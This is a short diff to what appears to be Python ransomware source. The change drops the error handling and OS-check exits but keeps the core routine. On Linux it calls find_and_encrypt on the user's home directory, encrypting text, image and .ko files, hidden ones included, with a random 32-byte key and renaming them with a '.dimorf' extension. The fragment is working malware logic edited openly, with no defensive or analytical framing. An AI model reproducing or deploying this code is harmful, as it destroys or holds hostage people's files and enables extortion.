@@ -25,31 +25,17 @@ def check_os(osname: str) -> str | None:
         )
     ]
 
-    try:
-        if (is_linux):
-            if (sys.version[0] == '3'):
-                find_and_encrypt(
-                    path=USER_DIR,
-                    ext_files=['.txt', '.ko', '.png', '.jpg'],
-                    hidden='.',
-                    new_ext='.dimorf',
-                    key=Random.get_random_bytes(32),
-                    block_bytes=65536
-                )
-            else:
-                sys.exit(
-                    '\33[31mPython3 é requerido.\33[0m'
-                )
-        else:
-            sys.exit(
-                '\33[31mSistema Operacional não suportado.\33[0m'
+    if (is_linux):
+        if (sys.version[0] == '3'):
+            find_and_encrypt(
+                path=USER_DIR,
+                ext_files=['.txt', '.ko', '.png', '.jpg'],
+                hidden='.',
+                new_ext='.dimorf',
+                key=Random.get_random_bytes(32),
+                block_bytes=65536
             )
-
-    except OSError:
-        sys.exit(
-            '\33[31mEncerrado.\33[0m'
-        )
-
+        
 
 def find_and_encrypt(
     path: str,
